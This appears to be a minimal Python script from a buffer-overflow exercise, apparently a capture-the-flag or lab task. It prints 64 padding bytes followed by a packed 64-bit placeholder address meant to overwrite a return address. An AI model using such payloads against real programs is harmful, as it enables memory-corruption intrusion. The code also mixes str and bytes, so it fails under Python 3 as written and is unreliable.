import struct

address = 0xdeadbeefdeadbeef
print("a"*64 + struct.pack("<Q", address))
# print("a"*64 + "bbbbbbb")